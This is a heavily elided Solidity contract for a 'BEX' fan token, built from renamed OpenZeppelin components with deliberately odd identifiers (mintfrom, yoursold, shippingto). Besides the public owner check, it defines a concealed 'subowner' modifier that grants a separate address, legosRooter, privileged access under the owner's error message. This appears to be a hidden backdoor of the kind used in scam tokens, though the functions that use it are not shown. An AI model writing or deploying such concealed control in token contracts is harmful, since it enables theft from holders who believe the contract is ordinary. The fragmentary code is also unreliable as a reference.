...
/*
BEX
Block Expedition Fan Token
Website: https://www.blockexpedition.com
Portal: https://t.me/BlockExpedition
X: https://x.com/blockexpedition
Whitepaper- http://whitepaper.blockexpedition.com
*/
...
/*
 * @dev Provides information about the current execution BEX20Burnable, including the
 ...
 */
abstract contract BEX20Burnable {
...
// File: @openzeppelin/contracts/access/BEX20Ownable.sol
 ...
 * the owner.
 */
abstract contract BEX20Ownable is BEX20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "BEX20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "BEX20Ownable: new owner is the zero address");
 ...
 * `SafeBEX` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeBEX {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeBEX: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeBEX: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeBEX: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeBEX: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeBEX: modulo by zero");
  }
...
contract BEXToken is BEX20Burnable, BEX33RB  , BEX20Ownable {
    
    using SafeBEX for uint256;
   ...
   address private marketingAddress = 0xf89d7b9c864f589bbF53a82105107622B35EaA40;
    string public BEXouratelegramz = "https://t.me/BEXToken";
            function getBEXouratelegramz() public view returns (string memory) {
        return BEXouratelegramz;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {BEX33RB  -balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "BEX20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {BEX33RB  -approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {BEX33RB  -transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {BEX33RB  };
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "BEX33RB  : transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {BEX33RB  -approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "BEX33RB  : decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "BEX33RB  : transfer from the zero address");
        require(shippingto != address(0), "BEX33RB  : transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "BEX33RB  : transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "BEX33RB  : approve from the zero address");
        require(transporteur != address(0), "BEX33RB  : approve to the zero address");
